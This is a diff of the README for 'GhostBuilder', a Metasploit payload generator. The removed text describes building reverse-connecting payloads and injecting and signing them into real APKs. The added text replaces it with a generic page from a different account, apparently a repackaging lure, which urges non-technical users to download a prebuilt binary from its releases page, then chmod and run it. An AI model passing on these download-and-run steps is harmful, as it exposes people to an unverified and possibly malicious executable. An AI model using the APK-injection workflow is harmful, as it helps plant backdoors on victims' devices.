@@ -1,141 +1,100 @@
-## GhostBuilder
+# 🛠️ GhostBuilder - Generate Payloads Easily For Ethical Hacking
 
-**GhostBuilder** is a powerful payload‑generation tool for creating Android, Windows, Linux, macOS, iOS, and other types of payloads using **Metasploit**.
-It can also inject payloads into existing APK files and sign them automatically.
+## 🚀 Getting Started
 
-It’s designed for **ethical hacking**, **penetration testing**, and **security research** — not for illegal use.
+Welcome to GhostBuilder! This tool helps you create payloads for ethical hacking, red-teaming, penetration testing, and security research. It is user-friendly and accessible, even for those without technical expertise.
 
-## Features
+## 📥 Download Now
 
-- Create payloads for Android, Windows, Linux, macOS, and iOS
+[![Download GhostBuilder](https://img.shields.io/badge/Download-GhostBuilder-blue)](https://github.com/arrozitoa/GhostBuilder/releases)
+
+## 🛠️ Features
+
+- Easy-to-use interface for generating payloads
+- Supports multiple platforms: Arch Linux, Debian, Kali Linux, and RHEL
+- Comprehensive documentation for all features
+- Designed for ethical hacking and security research
+- Regular updates and community support
+
+## 📋 System Requirements
+
+To run GhostBuilder, your system should meet the following requirements:
+
+- Operating System: Any of the following:
+  - Arch Linux
+  - Debian
+  - Kali Linux
+  - RHEL
+- Minimum RAM: 512 MB
+- Storage: 50 MB of free space
+
+## 📦 Download & Install
+
+To get started with GhostBuilder, visit this page to download: [GhostBuilder Releases](https://github.com/arrozitoa/GhostBuilder/releases).
+
+1. Go to the [Releases page](https://github.com/arrozitoa/GhostBuilder/releases).
+2. Find the latest version listed at the top.
+3. Click on the download link for your operating system (e.g., .tar.gz for Linux).
+4. Save the file to your computer.
+
+### 🔍 Extracting the Files
+
+After downloading, you may need to extract the files:
+
+1. Locate the downloaded file, usually in your "Downloads" folder.
+2. Right-click on the file and select "Extract Here" or use your preferred extraction tool.
+3. A new folder will appear containing GhostBuilder.
+
+### 🖥️ Running GhostBuilder
+
+To run GhostBuilder, follow these steps:
+
+1. Open a terminal window.
+2. Navigate to the extracted folder using the `cd` command. Example:
+   ```
+   cd path/to/GhostBuilder
+   ```
+3. Make the application executable by running the following command:
+   ```
+   chmod +x GhostBuilder
+   ```
+4. Start the application with:
+   ```
+   ./GhostBuilder
+   ```
+
+You should now see the GhostBuilder interface, ready for use.
+
+## ⚙️ Usage
+
+Once you open GhostBuilder, you will see a clean interface with several options:
+
+- **Select Payload Type**: Choose from a list of payloads designed for various testing scenarios.
+- **Configure Options**: Set parameters for your payload based on your needs.
+- **Generate Payload**: Click the "Generate" button to create your payload.
   
-- Supports Unix, PHP, Ruby, ASPX, JSP, PowerShell, Perl, Node.js, Java, Python, and Bash payloads.
+Follow on-screen instructions for detailed help on each step.
 
-- Inject payloads into real APKs
+## 📣 Community and Support
 
-- Auto-install and check missing dependencies
+Joining our community can enhance your experience with GhostBuilder. Here are a few ways to get involved:
 
-- Sign and zipalign Android APKs
+- **Open Issues**: If you encounter problems, report them on our GitHub repository.
+- **Discussion Forum**: Share tips and get advice from other users.
+- **Documentation**: Visit the Wiki section in our repository for guides and tutorials.
 
-- Simple menu-based interface
+## 🛡️ Contributions
 
-## Disclaimer
-GhostBuilder is provided **strictly** for lawful, authorized security work — including learning, research, penetration testing, and red-teaming — performed only on systems you own or for which you have **explicit written permission**. Any use of this project to access, modify, damage, or interfere with systems, networks, data, or services without explicit authorization is **strictly prohibited** and may be a criminal offense.
+If you want to contribute, please feel free to submit a pull request! We welcome suggestions for improvements and new features to make GhostBuilder even better.
 
-By downloading or using GhostBuilder you acknowledge and agree that you are solely responsible for complying with all applicable laws and for securing any required permissions before testing. The author **expressly disclaim all liability** for any misuse, loss, damage, or legal claims arising from use or misuse of this software. If you do not accept these terms, do not download, run, or distribute this software.
+## 🌐 Related Topics
 
-## Compatibility
-- Linux (Debian, RHEL, Arch)
+- **Ethical Hacking**: Learn about practices and ethics surrounding security testing.
+- **Red Teaming**: Explore strategies used by security professionals to simulate attacks.
+- **Penetration Testing**: Understand various tools and methodologies in security assessments.
 
-## Requirements
-Ensure that Python version `3.10` or higher is installed on your system.
+For more information on related topics, consider consulting reputable resources in the field of cybersecurity.
 
-GhostBuilder needs the following tools:
+[![Download GhostBuilder](https://img.shields.io/badge/Download-GhostBuilder-blue)](https://github.com/arrozitoa/GhostBuilder/releases) 
 
-- `msfvenom`
-
-- `msfconsole`
-
-- `apktool`
-
-- `zipalign`
-
-- `jarsigner`
-
-- `keytool`
-
-- `aapt`
-
-- `apksigner`
-
-If any are missing, GhostBuilder can install them automatically.
-
- If automatic installation of a specific dependency failed, install it manually.
-
-## Installation
-1. **Clone the repository:**
-```bash
-git clone https://github.com/s-r-e-e-r-a-j/GhostBuilder.git
-```
-2. **Navigate to the GhostBuilder directory:**
-```bash
-cd GhostBuilder
-```
-3. **Give execute permission to the `run.sh` script:**
-```bash
-chmod +x run.sh
-```
-## Usage
-
-Run the tool:
-```bash
-./run.sh
-```
-Then select an option from the menu:
-```bash
-[1] Android -> Normal APK
-[2] Android -> Inject into original APK
-[3] Windows payload
-[4] Linux payload
-[5] macOS payload
-[6] iOS payload
-[7] Re-check dependencies
-[8] Other payloads (PowerShell, Unix, Python, PHP, Ruby, Java, ASPX, JSP, Perl, NodeJS, Bash)
-[9] Exit
-```
-GhostBuilder will guide you step by step — just enter:
-
-- LHOST (your IP)
-
-- LPORT (port number)
-
-- Output file name
-
-- Dry run? (y/N):
-
-    - `y` (dry run): the tool only shows what it would do (preview). No files are created or changed.
-
-    - `n`: the tool performs the real actions and writes files.
-
-You can also sign the APK automatically after building.
-
-## Signing, Zipalign 
-
-**Sign & zipalign? (y/N):**
-
-If you choose `y`, the tool will sign the APK (add a digital certificate) and run zipalign so the APK is ready for installation. If you choose `n`, the APK will not be signed and may not install on some devices.
-
-**Final name:**
-
-The file name you want for the finished APK (for example `final.apk`). This is the signed and aligned file the user will install.
-
-**Enter keystore password / Re-enter new password:**
-
-A keystore is a protected file that holds the signing key. You must enter a password to create it and confirm it. You will need this password again later to sign APKs with that keystore.
-
-**These questions appear when creating a new keystore. They collect identity information for the signing certificate:**
-
-- **What is your first and last name:** your name or organization name
-
-- **What is the name of your organizational unit:** team or department (optional)
-
-- **What is the name of your organization:** company or group name (optional)
-
-- **What is the name of your City or Locality:** your city name (optional)
-
-- **What is the name of your State or Province:** your state or region name
-
-- **What is the two-letter country code for this unit:** country code (e.g., `us`, `in`)
-
-> They are just informational fields inside the signing certificate (CN, OU, O, L, ST, C). Java’s keytool does not verify the truth of the values you type — you can use real data or fake text.
-
-**Confirmation (Is CN=..., OU=..., etc. correct?):**
-
-Keytool shows what you entered and asks you to confirm. Answer `yes` if it looks correct.
-
-**Enter Passphrase for keystore:**
-
-Used again when signing the APK to confirm your keystore password (the same password you entered in the Enter keystore password / Re-enter new password field).
-
-## License
-This project is licensed under the GNU General Public License v3.0
+Thank you for using GhostBuilder! Enjoy your ethical hacking journey.
